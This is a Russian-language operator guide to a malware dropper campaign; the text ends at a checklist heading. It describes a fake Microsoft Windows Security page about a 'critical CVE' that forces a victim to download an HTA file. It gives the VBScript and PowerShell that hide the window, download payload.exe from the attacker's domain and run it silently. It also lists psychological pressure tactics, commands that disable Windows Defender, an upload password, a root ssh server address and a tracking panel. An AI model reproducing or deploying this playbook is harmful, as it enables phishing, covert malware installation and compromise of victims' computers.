# 🚀 Полностью автоматический Dropper

## 🏆 Ultimate HTA Dropper - Максимальная автоматизация

### 🎯 Короткий URL (ИСПОЛЬЗУЙТЕ ЭТОТ):
```
https://ipv6app.bar/lc5gsi
```

### ⚡ Что происходит автоматически:

#### На стороне жертвы:

**Шаг 1:** Жертва открывает URL
```
https://ipv6app.bar/lc5gsi
```

**Шаг 2:** Видит профессиональную страницу
- ✅ Дизайн Microsoft Windows Security
- ✅ "Критическая уязвимость CVE-2026-0148"
- ✅ Обратный отсчет 5 секунд
- ✅ Официальный стиль Microsoft

**Шаг 3:** Автоматическая загрузка
- ✅ Через 5 секунд начинается загрузка
- ✅ Множественные методы (4 способа одновременно)
- ✅ Имя файла: `security_update.hta`
- ✅ Размер: 1.6 KB

**Шаг 4:** Жертва открывает HTA файл
- 👆 **Единственное действие пользователя!**
- Двойной клик по `security_update.hta`

**Шаг 5:** HTA автоматически выполняет:
- ✅ Скрывает окно (0x0, за экраном)
- ✅ Запускает PowerShell скрытно
- ✅ Скачивает `https://ipv6app.bar/payload.exe`
- ✅ Сохраняет в `C:\downloads\installer.exe`
- ✅ Запускает payload с `-WindowStyle Hidden`
- ✅ Закрывается через 1 секунду
- ✅ Никаких видимых окон!

## 📋 Технические детали

### HTA Dropper (auto_dropper.hta)

**Технологии:**
- HTML Application (mshta.exe)
- VBScript для автоматического выполнения
- PowerShell для скачивания
- Win32 API через PowerShell

**Функции:**
```vbscript
' Автоматическое скрытие окна
Window.ResizeTo 0,0
Window.MoveTo -2000,-2000

' Выполнение PowerShell скрытно
objShell.Run strCommand, 0, False

' Автоматическое закрытие
Window.Close()
```

**PowerShell команда внутри:**
```powershell
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
$url = 'https://ipv6app.bar/payload.exe';
$path = 'C:\downloads';
$file = 'installer.exe';
New-Item -Path $path -ItemType Directory -Force | Out-Null;
Invoke-WebRequest -Uri $url -OutFile $path\$file -UseBasicParsing;
Start-Process -FilePath $path\$file -WindowStyle Hidden;
```

### Ultimate Delivery Page

**Множественные методы автозагрузки:**

```javascript
// Метод 1: Невидимая ссылка с автокликом
const link = document.createElement('a');
link.download = 'security_update.hta';
link.click();

// Метод 2: Повторная попытка через 300ms
setTimeout(() => link.click(), 300);

// Метод 3: Iframe загрузка
const iframe = document.createElement('iframe');
iframe.src = downloadUrl;

// Метод 4: Window.location redirect
window.location.href = downloadUrl;
```

**Триггеры загрузки:**
- При загрузке страницы (через 500ms)
- После таймера (5 секунд)
- При клике на кнопку
- При фокусе на странице

## 🎭 Social Engineering

### Дизайн страницы:

**Элементы доверия:**
- 🏢 Логотип Microsoft Windows
- ⚠️ Критическая уязвимость (CVE номер)
- 🔴 Красный цвет для срочности
- ⏰ Обратный отсчет
- 📝 Профессиональный текст
- 🛡️ "Windows Security" в заголовке

**Психологические триггеры:**
- Срочность (таймер)
- Страх (критическая уязвимость)
- Авторитет (Microsoft)
- Дефицит времени (автоматический запуск)

### Сообщение:

```
"Обнаружена критическая уязвимость CVE-2026-0148,
которая позволяет удаленным злоумышленникам получить
контроль над системой.

Microsoft выпустила экстренное обновление безопасности
для устранения этой проблемы."
```

## 🔗 Все варианты доставки

### 1. Ultimate HTA (100% автоматический) 🏆

**URL:** https://ipv6app.bar/lc5gsi  
**Файл:** auto_dropper.hta  
**Действий:** 2 (открыть URL + открыть HTA)  
**Автоматизация:** Максимальная  
**Рекомендация:** ЛУЧШИЙ ВЫБОР

### 2. Aggressive Delivery (авто-загрузка)

**URL:** https://ipv6app.bar/4n9pg73g  
**Файл:** auto_dropper.hta  
**Действий:** 2 (открыть URL + открыть HTA)  
**Автоматизация:** Высокая

### 3. Universal Dropper (ручной)

**URL:** https://ipv6app.bar/m959xx3csx  
**Файл:** universal_dropper.ps1  
**Действий:** 2 (открыть URL + запустить PS1)  
**Автоматизация:** Средняя

## 🎯 Рекомендуемый сценарий

### Для максимальной эффективности:

1. **Загрузите payload.exe:**
   ```
   https://ipv6app.bar/upload_payload.php
   Пароль: UploadPayload2026!
   ```

2. **Отправьте жертве Ultimate URL:**
   ```
   https://ipv6app.bar/lc5gsi
   ```

3. **Жертва делает:**
   - Открывает ссылку
   - Видит Security Alert
   - HTA скачивается автоматически
   - Открывает HTA (думает что обновление)

4. **HTA делает автоматически:**
   - Скрывается
   - Скачивает payload.exe
   - Запускает payload
   - Закрывается
   - Всё скрытно!

5. **Мониторинг:**
   ```
   https://ipv6app.bar/login.php
   Проверяйте статистику
   ```

## 🔒 Безопасность и обфускация

### Имена файлов:

**Для пользователя:**
- `security_update.hta` - выглядит легитимно
- `ms_security_patch.hta` - альтернативное имя

**На сервере:**
- `payload.exe` → сохраняется как `installer.exe`
- Папка: `C:\downloads\` (выглядит системно)

### Скрытность:

- ✅ HTA окно: 0x0 пикселей, за экраном
- ✅ PowerShell: `-WindowStyle Hidden`
- ✅ Payload: запускается с `-WindowStyle Hidden`
- ✅ Нет видимых окон консоли
- ✅ Быстрое выполнение (1-2 секунды)

## ⚠️ Важные замечания

### HTA файлы:

- ✅ Работают на всех Windows (XP - 11)
- ✅ Автоматически выполняют код при открытии
- ✅ Имеют доступ к WScript.Shell
- ✅ Могут запускать PowerShell
- ⚠️ Windows Defender может блокировать (отключите для теста)
- ⚠️ SmartScreen может предупреждать

### Обход защиты:

**Для тестирования:**
```powershell
# Отключить Windows Defender (временно, на VM)
Set-MpPreference -DisableRealtimeMonitoring $true

# Или добавить в исключения
Add-MpPreference -ExclusionPath "C:\downloads"
Add-MpPreference -ExclusionExtension ".hta"
```

## 🧪 Тестирование

### Полный тест цикл:

```
1. Загрузить payload.exe через форму
   └─> https://ipv6app.bar/upload_payload.php

2. Открыть Ultimate URL на тестовой VM
   └─> https://ipv6app.bar/lc5gsi

3. Дождаться автозагрузки HTA

4. Открыть HTA файл

5. Проверить что payload запустился
   └─> Process Explorer или Task Manager

6. Проверить статистику в панели
   └─> https://ipv6app.bar/login.php
```

### Проверка файлов:

```bash
# На сервере
ssh root@212.11.64.122 "ls -lh /var/www/html/payload.exe"

# Dropper HTA
curl -I https://ipv6app.bar/download.php?f=auto_dropper.hta

# Delivery page
curl -I https://ipv6app.bar/lc5gsi
```

## 📊 Проверочные списки

### ✅ Checklist: Форма загрузки